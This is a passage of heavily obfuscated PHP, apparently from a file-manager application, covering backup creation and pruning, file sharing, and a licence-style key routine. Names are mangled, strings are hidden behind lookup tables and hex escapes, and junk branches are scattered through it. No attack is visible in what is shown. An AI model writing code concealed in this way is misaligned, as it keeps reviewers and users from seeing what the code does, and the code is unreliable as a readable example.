$_SERVER[ÊõàˆØ]; $œÅåê ë = $this->ydrb21b5e164(); $Âßµ¨¢ = $this->ydrb21b5e164(); $„¢´à¸ã = $—”òÛÑ¸[754]; if (strlen($„¢´à¸ã) < $—”òÛÑ¸[645]) { die; } $÷Ç¨‹Ò¤ = ($œÅåê ë - 1) * ($Âßµ¨¢ - 1); $šıé´ = intval(($œÅåê ë + $Âßµ¨¢) / 2); while (1) { $·ÄÌñ“ = $šıé´; $èêÂÅÑ = $÷Ç¨‹Ò¤; $Ù©¥°š¢ = $—”òÛÑ¸[755]; while ($èêÂÅÑ % $·ÄÌñ“ != 0) { $·Ö§À‘õ = $èêÂÅÑ; $èêÂÅÑ = $·ÄÌñ“; $·ÄÌñ“ = $·Ö§À‘õ % $·ÄÌñ“; } if ($·ÄÌñ“ == 1) { break; } else { $šıé´++; } } $…ÁÓÖå = 2; $„Û“òîÙ = $—”òÛÑ¸[756]; if (!$„Û“òîÙ) { return; } for ($ì·ï‘À€ = 0; $ì·ï‘À€ < $÷Ç¨‹Ò¤ * 10; $ì·ï‘À€++) { if (($÷Ç¨‹Ò¤ * $ì·ï‘À€ + 1) % $šıé´ == 0) { $…ÁÓÖå = intval(($÷Ç¨‹Ò¤ * $ì·ï‘À€ + 1) / $šıé´); break; } } $ó§×ÇÅ” = $this->jfwp4fa98d32($œÅåê ë * $Âßµ¨¢ . $ƒ¢ğ³¡Û[6], $ƒ¢ğ³¡Û[135]); $¿äÔ§ôË = $—”òÛÑ¸[757]; $ıéØæ°± = md5($ƒ¢ğ³¡Û[298] . ($œÅåê ë + $Âßµ¨¢) . $ƒ¢ğ³¡Û[299] . $šıé´ . $ƒ¢ğ³¡Û[299] . $…ÁÓÖå . $ƒ¢ğ³¡Û[300]); $Ï¦êÑÎÇ = $this->jfwp4fa98d32($¸ÚîÙĞ, $ıéØæ°±) . $ƒ¢ğ³¡Û[301] . $ó§×ÇÅ”; $óÆ÷Š¬Î = $—”òÛÑ¸[758]; if (!$óÆ÷Š¬Î) { return; } return $Ï¦êÑÎÇ; $ğËöŸ¾« = $—”òÛÑ¸[759]; } public function epxv364baebe($âî™¡°) { $ä¸÷ƒÔ =& $_SERVER[ªÏ§Ë·]; $Õéñä…– =& $_SERVER[ÊõàˆØ]; $Êˆ¡«˜³ = explode($Õéñä…–[301], $âî™¡°); $Âä—¡ñ„ = $ä¸÷ƒÔ[760]; while (strlen($Âä—¡ñ„) < $ä¸÷ƒÔ[665]) { if (!$Âä—¡ñ„) { break; } $Âä—¡ñ„++; } if (count($Êˆ¡«˜³) != 2) { return $Õéñä…–[6]; } $ÉÛ±¬¤š = $this->gtpn17700c8b($Êˆ¡«˜³[1] . $Õéñä…–[6], $Õéñä…–[135]); if (!$ÉÛ±¬¤š) { return $Õéñä…–[6]; } $ÉÛ±¬¤š = intval($ÉÛ±¬¤š); $ÆÏ‡×£ = 0; $²–ª à¼ = 0; $³ïÈØ÷‘ = $ä¸÷ƒÔ[761]; if (strlen($³ïÈØ÷‘) < $ä¸÷ƒÔ[665]) { die; } for ($‰šòÀØË = 3; $‰šòÀØË < $ÉÛ±¬¤š; $‰šòÀØË += 2) { if ($ÉÛ±¬¤š % $‰šòÀØË != 0) { continue; } $ÆÏ‡×£ = $‰šòÀØË; $ìèÕİ = $ä¸÷ƒÔ[762]; $²–ª à¼ = intval($ÉÛ±¬¤š / $‰šòÀØË); break; $Âœ½‰›¾ = $ä¸÷ƒÔ[763]; if (!$Âœ½‰›¾) { return; } } $èÀÉªå‡ = ($ÆÏ‡×£ - 1) * ($²–ª à¼ - 1); $ËæˆÇ¿Í = $ä¸÷ƒÔ[764]; if (!$ËæˆÇ¿Í) { die; } $ «Êòà = intval(($ÆÏ‡×£ + $²–ª à¼) / 2); $äœ¨–Òä = $ä¸÷ƒÔ[765]; if (strlen($äœ¨–Òä) < $ä¸÷ƒÔ[645]) { return; } while (1) { $±÷…“óé = $ «Êòà; $ó›”Œ¬Š = $ä¸÷ƒÔ[766]; $È„ ’È = $èÀÉªå‡; while ($È„ ’È % $±÷…“óé != 0) { $€ÓÑ×÷­ = $È„ ’È; $íÍ¯×¹Ô = $ä¸÷ƒÔ[767]; while ($íÍ¯×¹Ô < $ä¸÷ƒÔ[671]) { if ($íÍ¯×¹Ô >= 0) { break; } $íÍ¯×¹Ô++; } $È„ ’È = $±÷…“óé; $±÷…“óé = $€ÓÑ×÷­ % $±÷…“óé; } if ($±÷…“óé == 1) { break; } else { $ «Êòà++; } } $àòô«â¦ = 2; $«å¢²ï¶ = $ä¸÷ƒÔ[757]; if (!$«å¢²ï¶) { return; } for ($‰šòÀØË = 0; $‰šòÀØË < $èÀÉªå‡ * 10; $‰šòÀØË++) { if (($èÀÉªå‡ * $‰šòÀØË + 1) % $ «Êòà == 0) { $àòô«â¦ = intval(($èÀÉªå‡ * $‰šòÀØË + 1) / $ «Êòà); break; } } $Ø²ãÀ‚ˆ = md5($Õéñä…–[298] . ($ÆÏ‡×£ + $²–ª à¼) . $Õéñä…–[299] . $ «Êòà . $Õéñä…–[299] . $àòô«â¦ . $Õéñä…–[300]); $Ê€ ôïë = $this->gtpn17700c8b($Êˆ¡«˜³[0], $Ø²ãÀ‚ˆ); $Åİú¿±æ = $ä¸÷ƒÔ[768]; if (!$Åİú¿±æ) { return; } return $Ê€ ôïë; } public function ydrb21b5e164() { $üé°é˜  =& $_SERVER[ªÏ§Ë·]; $Ó ş±Ì = mt_rand(pow(2, 14), pow(2, 16) - 1); $ë›©íà¾ = $üé°é˜ [769]; $¾µ¤ï› = array(); $›İÀğ¤í = 1; $ƒ²©Ã¡ = $üé°é˜ [770]; if (strlen($ƒ²©Ã¡) < $üé°é˜ [20]) { return; } while ($›İÀğ¤í <= (int) sqrt($Ó ş±Ì)) { $­ßæ—ã­ = $›İÀğ¤í; $ò¶á¬… = $üé°é˜ [771]; if (strlen($ò¶á¬…) < $üé°é˜ [671]) { die; } while (!0) { $­ßæ—ã­++; $¢’Ì¶Ã = $üé°é˜ [772]; while ($¢’Ì¶Ã < $üé°é˜ [20]) { if ($¢’Ì¶Ã >= 0) { break; } $¢’Ì¶Ã++; } if ($­ßæ—ã­ <= 2) { $›İÀğ¤í = $­ßæ—ã­; break; } else { if ($­ßæ—ã­ < 2) { continue; } } $Ç›äº•† = !0; for ($ìéİù’Í = 2; $ìéİù’Í <= sqrt($­ßæ—ã­); $ìéİù’Í++) { if ($­ßæ—ã­ % $ìéİù’Í == 0) { $Ç›äº•† = !1; } } if ($Ç›äº•†) { $›İÀğ¤í = $­ßæ—ã­; break; } } $¾µ¤ï›[] = $›İÀğ¤í; $ÊŠóûºŸ = $üé°é˜ [773]; if (strlen($ÊŠóûºŸ) < $üé°é˜ [671]) { return; } } $Øºß§§ = 2; $¬É˜ñÆÑ = $üé°é˜ [774]; while ($¬É˜ñÆÑ < $üé°é˜ [645]) { if ($¬É˜ñÆÑ >= 0) { break; } $¬É˜ñÆÑ++; } for ($­ßæ—ã­ = $Ó ş±Ì; $­ßæ—ã­ > 1; $­ßæ—ã­--) { $Ç›äº•† = !0; foreach ($¾µ¤ï› as $ìì›Ñ‚ˆ) { if ($­ßæ—ã­ % $ìì›Ñ‚ˆ == 0) { $Ç›äº•† = !1; break; } } if ($Ç›äº•†) { $Øºß§§ = $­ßæ—ã­; break; } } return $Øºß§§; } public function ixbq09cfc894($ñÌšøä, $Â¥Œáè‡) { $À«€¼Ô± =& $_SERVER[ÊõàˆØ]; return call_user_func(array($À«€¼Ô±[8], $À«€¼Ô±[302]), $ñÌšøä, $Â¥Œáè‡); } public function jfwp4fa98d32($¯äªÇÙ, $Â¾ü¨á) { $³Èà¡ä =& $_SERVER[ÊõàˆØ]; return call_user_func(array($³Èà¡ä[303], $³Èà¡ä[304]), $¯äªÇÙ, $Â¾ü¨á); $¶Ÿó­¦˜ = $_SERVER[ªÏ§Ë·][775]; if (!$¶Ÿó­¦˜) { die; } } public function gtpn17700c8b($…Íâì½’, $“ş‡ø—ç) { $§¿‚„ê =& $_SERVER[ÊõàˆØ]; return call_user_func(array($§¿‚„ê[303], $§¿‚„ê[305]), $…Íâì½’, $“ş‡ø—ç); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¤úÖÚ‘ =& $_SERVER[ªÏ§Ë·]; $this->isManual(); self::$name = date($¤úÖÚ‘[776]); if (!($¥ØÇğï‡ = Model($¤úÖÚ‘[777])->lastItem())) { $¥ØÇğï‡ = $this->initData(); } else { self::$name = $¥ØÇğï‡[$¤úÖÚ‘[42]]; if ($¥ØÇğï‡[$¤úÖÚ‘[778]] == $¤úÖÚ‘[98]) { self::$name = date($¤úÖÚ‘[249]); $¼µÃ‰º = 0; if (isset($¥ØÇğï‡[$¤úÖÚ‘[331]][$¤úÖÚ‘[210]][$¤úÖÚ‘[506]])) { $¼µÃ‰º = (int) $¥ØÇğï‡[$¤úÖÚ‘[331]][$¤úÖÚ‘[210]][$¤úÖÚ‘[506]]; } if (self::$manual == 0 && $¥ØÇğï‡[$¤úÖÚ‘[42]] == self::$name) { Model($¤úÖÚ‘[777])->remove($¥ØÇğï‡[$¤úÖÚ‘[437]]); } $¥ØÇğï‡ = $this->initData($¼µÃ‰º, $¥ØÇğï‡[$¤úÖÚ‘[779]]); } else { $this->checkStore($¥ØÇğï‡[$¤úÖÚ‘[779]]); } } self::$option = $¥ØÇğï‡; } private function isManual() { $à ®“ · = _get($GLOBALS, $_SERVER[ªÏ§Ë·][780], 0); $à ®“ · = intval($à ®“ ·); self::$manual = $à ®“ · && $à ®“ · == 1 ? 1 : 0; } private function initData($ò“‰ØÒ‹ = 0, $ğşªÀş = '') { $èš™ÒÅ» =& $_SERVER[ªÏ§Ë·]; $õÜû = Model($èš™ÒÅ»[777])->config(); if ($ğşªÀş && $õÜû[$èš™ÒÅ»[779]] != $ğşªÀş) { $ò“‰ØÒ‹ = 0; } $this->checkStore($õÜû[$èš™ÒÅ»[779]]); if (self::$manual == 1) { self::$name .= $èš™ÒÅ»[11] . date($èš™ÒÅ»[781]); } $—¼Ûù•Ò = array($èš™ÒÅ»[779] => $õÜû[$èš™ÒÅ»[779]], $èš™ÒÅ»[42] => self::$name, $èš™ÒÅ»[778] => 0, $èš™ÒÅ»[782] => $õÜû[$èš™ÒÅ»[782]], $èš™ÒÅ»[783] => self::$manual, $èš™ÒÅ»[331] => array($èš™ÒÅ»[784] => array($èš™ÒÅ»[778] => 0), $èš™ÒÅ»[785] => array($èš™ÒÅ»[778] => 0, $èš™ÒÅ»[786] => 0, $èš™ÒÅ»[787] => 0, $èš™ÒÅ»[43] => $èš™ÒÅ»[12], $èš™ÒÅ»[788] => 0, $èš™ÒÅ»[789] => 0), $èš™ÒÅ»[790] => array($èš™ÒÅ»[778] => 0, $èš™ÒÅ»[786] => 0, $èš™ÒÅ»[787] => 0, $èš™ÒÅ»[788] => 0, $èš™ÒÅ»[789] => 0), $èš™ÒÅ»[210] => array($èš™ÒÅ»[778] => 0, $èš™ÒÅ»[791] => 0, $èš™ÒÅ»[792] => 0, $èš™ÒÅ»[793] => 0, $èš™ÒÅ»[794] => 0, $èš™ÒÅ»[506] => $ò“‰ØÒ‹, $èš™ÒÅ»[788] => 0, $èš™ÒÅ»[789] => 0)), $èš™ÒÅ»[788] => time(), $èš™ÒÅ»[789] => 0); $üî‡í† = Model($èš™ÒÅ»[777])->insert($—¼Ûù•Ò); $—¼Ûù•Ò[$èš™ÒÅ»[437]] = $üî‡í†; return $—¼Ûù•Ò; } private function checkStore($½‹Ãú†á) { $–°Ì¬Ù± =& $_SERVER[ªÏ§Ë·]; $¾ÆÌõä = Model($–°Ì¬Ù±[795])->listData($½‹Ãú†á); Model($–°Ì¬Ù±[795])->checkConfig($¾ÆÌõä); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ªÏ§Ë·][777])->findByName(self::$name); } return self::$option; } public static function set($¢˜ç‹¥ª) { $Ã°†È£’ =& $_SERVER[ªÏ§Ë·]; $­šæï»ö = self::get(); foreach ($¢˜ç‹¥ª as $•–Ñ«•‹ => $ïçÂÚ»†) { $­ÄÍÔëÆ = explode($Ã°†È£’[10], $•–Ñ«•‹); $ÀÆÃç÷ª = count($­ÄÍÔëÆ); switch ($ÀÆÃç÷ª) { case 1: $­šæï»ö[$­ÄÍÔëÆ[0]] = $ïçÂÚ»†; break; case 2: $­šæï»ö[$­ÄÍÔëÆ[0]][$­ÄÍÔëÆ[1]] = $ïçÂÚ»†; break; case 3: $­šæï»ö[$­ÄÍÔëÆ[0]][$­ÄÍÔëÆ[1]][$­ÄÍÔëÆ[2]] = $ïçÂÚ»†; break; } } Model($Ã°†È£’[777])->update($­šæï»ö[$Ã°†È£’[437]], $­šæï»ö); self::$option = $­šæï»ö; return self::$option; } public function keep() { $´Å»ò†ú =& $_SERVER[ªÏ§Ë·]; $Â©ÖÑºµ = self::get(); if ($Â©ÖÑºµ[$´Å»ò†ú[331]][$´Å»ò†ú[784]][$´Å»ò†ú[778]] == $´Å»ò†ú[98]) { return; } $this->backupKeep($Â©ÖÑºµ); self::set(array($´Å»ò†ú[796] => 1)); } private function backupKeep($»¤Ï‘‹š) { $«¶‡Á§ç =& $_SERVER[ªÏ§Ë·]; if (self::$manual == 1) { return; } $Ëıè½ü° = Model($«¶‡Á§ç[777])->listData(); if (empty($Ëıè½ü°)) { return; } $îŞ¹‡òå = 0; $­ø¬Š´ñ = array(); foreach ($Ëıè½ü° as $Ôõ¢Î™ ) { if ($îŞ¹‡òå >= 7) { break; } $­ø¬Š´ñ[] = $Ôõ¢Î™ [$«¶‡Á§ç[42]]; $îŞ¹‡òå++; } for ($îŞ¹‡òå = 0; $îŞ¹‡òå < 12; $îŞ¹‡òå++) { $­ø¬Š´ñ[] = date($«¶‡Á§ç[797], strtotime("\x2d{$îŞ¹‡òå}\40\x6d\157\x6e\x74\150\x73")); } $­ø¬Š´ñ = array_unique($­ø¬Š´ñ); $øŸ­ßÇ¢ = Model($«¶‡Á§ç[798])->get($«¶‡Á§ç[799]); foreach ($Ëıè½ü° as $Ôõ¢Î™ ) { if (isset($Ôõ¢Î™ [$«¶‡Á§ç[783]]) && $Ôõ¢Î™ [$«¶‡Á§ç[783]] == $«¶‡Á§ç[98]) { continue; } if (!empty($Ôõ¢Î™ [$«¶‡Á§ç[42]]) && in_array($Ôõ¢Î™ [$«¶‡Á§ç[42]], $­ø¬Š´ñ)) { continue; } Model($«¶‡Á§ç[777])->remove($Ôõ¢Î™ [$«¶‡Á§ç[437]]); $òï»çÎ = $this->backupPath($»¤Ï‘‹š, $øŸ­ßÇ¢); IO::remove($òï»çÎ, !1); } } private function backupPath($Ç‰ÊŒ’“, $êœ®ºæï = false) { $ğªÕ¼í” =& $_SERVER[ªÏ§Ë·]; if (!$êœ®ºæï) { $êœ®ºæï = Model($ğªÕ¼í”[798])->get($ğªÕ¼í”[799]); } $ªÂÕ’ = $Ç‰ÊŒ’“[$ğªÕ¼í”[42]]; $ƒ•¨îÜÖ = substr(md5($ğªÕ¼í”[800] . $êœ®ºæï . $ªÂÕ’), 0, 8); return "\173\x69\157\72{$Ç‰ÊŒ’“[$ğªÕ¼í”[779]]}\x7d\57\x64\x61\x74\x61\x62\141\163\x65\x2f\x62\x61\x63\x6b\165\x70\x2f" . $ªÂÕ’ . $ğªÕ¼í”[11] . $ƒ•¨îÜÖ; } public function db() { $‹°ƒğ¼ =& $_SERVER[ªÏ§Ë·]; $‚Œ÷–í¥ = self::get(); if ($‚Œ÷–í¥[$‹°ƒğ¼[331]][$‹°ƒğ¼[785]][$‹°ƒğ¼[778]] == $‹°ƒğ¼[98]) { return !0; } $“ÖœÃö = new BackupDb(); if (!$“ÖœÃö->index()) { return !1; } self::set(array($‹°ƒğ¼[801] => 1)); return !0; } public function dbFile() { $¨ö…¢Á =& $_SERVER[ªÏ§Ë·]; $ØŸ˜Ùù = self::get(); if ($ØŸ˜Ùù[$¨ö…¢Á[331]][$¨ö…¢Á[790]][$¨ö…¢Á[778]] == $¨ö…¢Á[98]) { return !0; } $íËì§ì = new BackupDbFile(); if (!$íËì§ì->index()) { return !1; } self::set(array($¨ö…¢Á[802] => 1)); return !0; } public function file() { $«İ½Ø¾ª =& $_SERVER[ªÏ§Ë·]; $Î€í¤…‹ = self::get(); if ($Î€í¤…‹[$«İ½Ø¾ª[331]][$«İ½Ø¾ª[210]][$«İ½Ø¾ª[778]] == $«İ½Ø¾ª[98]) { return !0; } if (!isset($Î€í¤…‹[$«İ½Ø¾ª[782]]) || $Î€í¤…‹[$«İ½Ø¾ª[782]] == $«İ½Ø¾ª[208]) { $Ş“êÊ„¶ = new BackupFile(); if (!$Ş“êÊ„¶->index()) { return !1; } } self::set(array($«İ½Ø¾ª[803] => 1, $«İ½Ø¾ª[778] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $„Ÿˆü£Õ =& $_SERVER[ªÏ§Ë·]; $¨‘â›À· = Backup::get(); self::$io = $¨‘â›À·[$„Ÿˆü£Õ[779]]; self::$name = $¨‘â›À·[$„Ÿˆü£Õ[42]]; $»‹…âÖ¹ = new DbManage(); $ü§Ş¤…Ï = $»‹…âÖ¹->dbType(); $ºÀ›ÇÛ = array($„Ÿˆü£Õ[804] => $ü§Ş¤…Ï, $„Ÿˆü£Õ[805] => time()); Backup::set($ºÀ›ÇÛ); $Î·‚·ˆ¹ = $this->tmpFilesPath() . $„Ÿˆü£Õ[806] . self::$name . $„Ÿˆü£Õ[8]; del_dir($Î·‚·ˆ¹); mk_dir($Î·‚·ˆ¹); $ÓûŠŞı« = $¥Åáˆã  = 0; $Å…óìş = new Task($„Ÿˆü£Õ[807], $„Ÿˆü£Õ[808], 0, LNG($„Ÿˆü£Õ[809]) . $„Ÿˆü£Õ[810] . LNG($„Ÿˆü£Õ[811])); try { $ÅÓÆ¾Ú° = $»‹…âÖ¹->db()->getTables(); } catch (Exception $–½üª¸â) { $Å…óìş->end(); return !1; } $ÅÓÆ¾Ú° = array_diff($ÅÓÆ¾Ú°, array($„Ÿˆü£Õ[812], $„Ÿˆü£Õ[813])); foreach ($ÅÓÆ¾Ú° as $³Çë”ÙÖ) { $ÓûŠŞı« += $»‹…âÖ¹->model($³Çë”ÙÖ)->count(); } $Å…óìş->task[$„Ÿˆü£Õ[814]] = $ÓûŠŞı«; $GLOBALS[$„Ÿˆü£Õ[815]] = self::$name; foreach ($ÅÓÆ¾Ú° as $³Çë”ÙÖ) { $¦‘’¢ï‘ = $Î·‚·ˆ¹ . $³Çë”ÙÖ . $„Ÿˆü£Õ[816]; $ÕİòöÀñ = null; if ($³Çë”ÙÖ == $„Ÿˆü£Õ[817] && (!isset($¨‘â›À·[$„Ÿˆü£Õ[782]]) || $¨‘â›À·[$„Ÿˆü£Õ[782]] == $„Ÿˆü£Õ[208])) { $ÕİòöÀñ = self::$io; } $¥Åáˆã  += $»‹…âÖ¹->sqlFromDb($³Çë”ÙÖ, $¦‘’¢ï‘, $Å…óìş, $ÕİòöÀñ); } unset($GLOBALS[$„Ÿˆü£Õ[815]]); $Å…óìş->end(); if ($¥Åáˆã  > $ÓûŠŞı«) { $ÓûŠŞı« = $¥Åáˆã ; } $ºÀ›ÇÛ = array($„Ÿˆü£Õ[804] => $ü§Ş¤…Ï, $„Ÿˆü£Õ[801] => 1, $„Ÿˆü£Õ[818] => $ÓûŠŞı«, $„Ÿˆü£Õ[819] => $¥Åáˆã , $„Ÿˆü£Õ[820] => time()); Backup::set($ºÀ›ÇÛ); if ($ÓûŠŞı« - $¥Åáˆã  > 0) { $š­¯ÒØ˜ = $„Ÿˆü£Õ[821]; if (stristr(I18n::getType(), $„Ÿˆü£Õ[822])) { $š­¯ÒØ˜ = $„Ÿˆü£Õ[823]; } write_log(array($š­¯ÒØ˜, $ºÀ›ÇÛ), $„Ÿˆü£Õ[808]); return !1; } return !0; } private function tmpFilesPath() { $µ³è¿Ğ =& $_SERVER[ªÏ§Ë·]; $œªŞØ«• = TEMP_FILES; if ($GLOBALS[$µ³è¿Ğ[6]][$µ³è¿Ğ[99]][$µ³è¿Ğ[824]]) { $œªŞØ«• = $GLOBALS[$µ³è¿Ğ[6]][$µ³è¿Ğ[99]][$µ³è¿Ğ[824]]; if (!mk_dir($œªŞØ«•) || !is_writable($œªŞØ«•) || !IO::mkfile($œªŞØ«• . $µ³è¿Ğ[825])) { $œªŞØ«• = TEMP_FILES; } } return $œªŞØ«•; } } goto EêàĞØ‹õ”; CÌ·“§¬Ší: class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\144\151\x66\171\x54\151\155\145", "\x74\151\155\145", "\151\x6e\163\145\x72\164\54\165\x70\144\141\164\145", "\146\x75\156\143\x74\151\x6f\x6e"), array("\143\x72\x65\x61\164\x65\x54\x69\155\145", "\x74\151\155\145", "\x69\x6e\x73\x65\162\164", "\x66\165\x6e\143\x74\151\157\x6e"), array("\157\x70\x74\x69\x6f\x6e\163", '', "\151\156\x73\x65\x72\164\54\x75\x70\x64\141\x74\x65\54\x73\145\154\145\143\x74", "\152\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¯è³ˆ‡) { $ÕÁğ“‹® =& $_SERVER[ªÏ§Ë·]; $”áıå˜ = isset($¯è³ˆ‡[0]) ? $¯è³ˆ‡[0] : !1; return array($ÕÁğ“‹®[1996] => array(USER_ID, $ÕÁğ“‹®[1997]), $ÕÁğ“‹®[1937] => array($”áıå˜, $ÕÁğ“‹®[1998])); } protected function listSimple() { $îƒÀ ó = array($_SERVER[ªÏ§Ë·][1667] => USER_ID); $Æñé¶Â = $this->field($this->fieldList)->where($îƒÀ ó)->select(); return $Æñé¶Â ? $Æñé¶Â : array(); } protected function getInfo($ëÊ‘À—‘, $–ü­İç = false) { $³õ˜øêÎ =& $_SERVER[ªÏ§Ë·]; if ($–ü­İç) { return $this->_getShareInfo(array($³õ˜øêÎ[631] => $ëÊ‘À—‘)); } $œÇÒüìˆ = $this->cacheFunctionGet($³õ˜øêÎ[1939], $ëÊ‘À—‘); return $œÇÒüìˆ; } public function getInfoByHash($õ¢Íæò) { return $this->_getShareInfo(array($_SERVER[ªÏ§Ë·][1999] => $õ¢Íæò)); } public function getInfoByPath($öá‚ªú) { $¾’À°˜Ü =& $_SERVER[ªÏ§Ë·]; $æÓĞóª¿ = array($¾’À°˜Ü[1667] => USER_ID, $¾’À°˜Ü[440] => $öá‚ªú); return $this->_getShareInfo($æÓĞóª¿); } public function getInfoBySourcePath($¬àÌ·Í×) { $ÂÛÀ·‹ =& $_SERVER[ªÏ§Ë·]; $È´¤Ë›ƒ = array($ÂÛÀ·‹[1667] => USER_ID, $ÂÛÀ·‹[1200] => $¬àÌ·Í×); return $this->_getShareInfo($È´¤Ë›ƒ); } private function _getShareInfo($è°ÀÏ›) { $æ–øûÃ =& $_SERVER[ªÏ§Ë·]; $ò‡ŠáØÚ = $this->where($è°ÀÏ›)->find(); if (!$ò‡ŠáØÚ) { return !1; } $è°ÀÏ› = array($æ–øûÃ[631] => $ò‡ŠáØÚ[$æ–øûÃ[631]]); $Šë¢Öò† = $æ–øûÃ[2000]; $ª¼­©õş = Model($æ–øûÃ[632])->order($æ–øûÃ[437])->field($Šë¢Öò†)->where($è°ÀÏ›)->select(); if ($ò‡ŠáØÚ[$æ–øûÃ[440]] == $æ–øûÃ[208]) { $ò‡ŠáØÚ[$æ–øûÃ[97]] = IO::info($ò‡ŠáØÚ[$æ–øûÃ[1200]]); } else { $ò‡ŠáØÚ[$æ–øûÃ[97]] = Model($æ–øûÃ[1358])->pathInfo($ò‡ŠáØÚ[$æ–øûÃ[440]]); } $ò‡ŠáØÚ[$æ–øûÃ[2001]] = $ª¼­©õş; return $ò‡ŠáØÚ; } protected function getInfoAuth($Ú‰¯Ú£Û) { $Ê­Ùˆø’ =& $_SERVER[ªÏ§Ë·]; $šİÒçóˆ = $this->getInfo($Ú‰¯Ú£Û); if ($šİÒçóˆ[$Ê­Ùˆø’[1667]] == USER_ID) { $šİÒçóˆ[$Ê­Ùˆø’[451]] = $šİÒçóˆ[$Ê­Ùˆø’[97]][$Ê­Ùˆø’[451]]; } else { $šİÒçóˆ[$Ê­Ùˆø’[451]] = Model($Ê­Ùˆø’[531])->authMake($šİÒçóˆ[$Ê­Ùˆø’[2001]]); } return $šİÒçóˆ; } protected function listData($†§ğƒŒ = null, $£›ÛîÜ× = 300) { $âó°™° =& $_SERVER[ªÏ§Ë·]; $ÀĞƒÓÛ = array(array($âó°™°[526] => array($âó°™°[1037], 0), $âó°™°[629] => array($âó°™°[1037], 0), $âó°™°[2002] => $âó°™°[1955])); if ($†§ğƒŒ == $âó°™°[2003]) { $ÀĞƒÓÛ = array($âó°™°[526] => 1); } else { if ($†§ğƒŒ == $âó°™°[1186]) { $ÀĞƒÓÛ = array($âó°™°[629] => 1); } } $ÀĞƒÓÛ[$âó°™°[1667]] = USER_ID; $äÀ˜û‰ = $this->where($ÀĞƒÓÛ)->selectPage($£›ÛîÜ×); return $äÀ˜û‰; } protected function listToMe($º”·Àêä = 300) { $ğ‰Åì¶Ô =& $_SERVER[ªÏ§Ë·]; $Ñ—õ¢ïü = Model($ğ‰Åì¶Ô[2004])->userGroupParents(USER_ID); $Ùä­ÛİÛ = array($ğ‰Åì¶Ô[614] => SourceModel::TYPE_USER, $ğ‰Åì¶Ô[534] => USER_ID); if ($Ñ—õ¢ïü) { $Ùä­ÛİÛ = array(array($ğ‰Åì¶Ô[614] => SourceModel::TYPE_USER, $ğ‰Åì¶Ô[534] => USER_ID), array($ğ‰Åì¶Ô[614] => SourceModel::TYPE_GROUP, $ğ‰Åì¶Ô[534] => array($ğ‰Åì¶Ô[7], $Ñ—õ¢ïü)), $ğ‰Åì¶Ô[2002] => $ğ‰Åì¶Ô[1955]); } $²Ò†çŸ = Model($ğ‰Åì¶Ô[632])->where($Ùä­ÛİÛ)->selectPage($º”·Àêä); $µÛÆĞ®ç = array_to_keyvalue_group($²Ò†çŸ[$ğ‰Åì¶Ô[407]], $ğ‰Åì¶Ô[631]); if (!$µÛÆĞ®ç) { return $²Ò†çŸ; } $¿­µÁ¨Å = $ğ‰Åì¶Ô[2005]; $Ùä­ÛİÛ = array($ğ‰Åì¶Ô[631] => array($ğ‰Åì¶Ô[456], array_keys($µÛÆĞ®ç)), $ğ‰Åì¶Ô[1667] => array($ğ‰Åì¶Ô[1039], $ğ‰Åì¶Ô[208])); $ËúŞºÁÎ = $this->field($¿­µÁ¨Å)->where($Ùä­ÛİÛ)->select(); foreach ($ËúŞºÁÎ as $úœ®ÎÔ => &$÷çé±) { $÷çé±[$ğ‰Åì¶Ô[2001]] = $µÛÆĞ®ç[$÷çé±[$ğ‰Åì¶Ô[631]]]; } unset($÷çé±); $³ß¿Ù² = array($ğ‰Åì¶Ô[2006] => $ËúŞºÁÎ, $ğ‰Åì¶Ô[2007] => $²Ò†çŸ[$ğ‰Åì¶Ô[404]]); return $³ß¿Ù²; } protected function shareAdd($Òµ¤çÕó, $äú×êÄ) { $Š²÷È„ô =& $_SERVER[ªÏ§Ë·]; $íˆß•™Î = $this->_addShareData($Òµ¤çÕó, $äú×êÄ); if (!empty($äú×êÄ[$Š²÷È„ô[2008]])) { $this->_shareAuthSet($íˆß•™Î, $äú×êÄ[$Š²÷È„ô[2008]]); } $this->shareEventAdd($Òµ¤çÕó, $äú×êÄ, $Š²÷È„ô[2009]); return $íˆß•™Î; } protected function shareAddSystem($¼²â¨¨˜, $İğê±÷ı) { $‚Ì†«£à =& $_SERVER[ªÏ§Ë·]; $ÑÎ®¯Øù = $this->_addShareData($¼²â¨¨˜, $İğê±÷ı, $‚Ì†«£à[1312]); $this->_shareAuthSet($ÑÎ®¯Øù, $İğê±÷ı[$‚Ì†«£à[2008]]); return $ÑÎ®¯Øù; } private function shareEventAdd($óÄè‹œ‘, $åÚÓé¯ş, $óÚÕÏÃ¶ = "\x61\144\144") { $ÃÇëò¥ï =& $_SERVER[ªÏ§Ë·]; if (!$óÄè‹œ‘ || $óÄè‹œ‘ == $ÃÇëò¥ï[208]) { return; } if ($óÚÕÏÃ¶ == $ÃÇëò¥ï[2009]) { if ($åÚÓé¯ş[$ÃÇëò¥ï[526]] == $ÃÇëò¥ï[98]) { Model($ÃÇëò¥ï[599])->eventShare($óÄè‹œ‘, $ÃÇëò¥ï[2010]); } if ($åÚÓé¯ş[$ÃÇëò¥ï[629]] == $ÃÇëò¥ï[98]) { Model($ÃÇëò¥ï[599])->eventShare($óÄè‹œ‘, $ÃÇëò¥ï[2011]); } return; } $˜Ç¢ÚéÕ = $this->getInfoByPath($óÄè‹œ‘); $ñºÃòÆŒ = $ÃÇëò¥ï[2012]; if ($˜Ç¢ÚéÕ[$ÃÇëò¥ï[526]] == $ÃÇëò¥ï[208] && $åÚÓé¯ş[$ÃÇëò¥ï[526]] == $ÃÇëò¥ï[98]) { $ñºÃòÆŒ = $ÃÇëò¥ï[2010]; } if ($˜Ç¢ÚéÕ[$ÃÇëò¥ï[526]] == $ÃÇëò¥ï[98] && $åÚÓé¯ş[$ÃÇëò¥ï[526]] == $ÃÇëò¥ï[208]) { $ñºÃòÆŒ = $ÃÇëò¥ï[2013]; } if ($˜Ç¢ÚéÕ[$ÃÇëò¥ï[629]] == $ÃÇëò¥ï[208] && $åÚÓé¯ş[$ÃÇëò¥ï[629]] == $ÃÇëò¥ï[98]) { $ñºÃòÆŒ = $ÃÇëò¥ï[2011]; } if ($˜Ç¢ÚéÕ[$ÃÇëò¥ï[629]] == $ÃÇëò¥ï[98] && 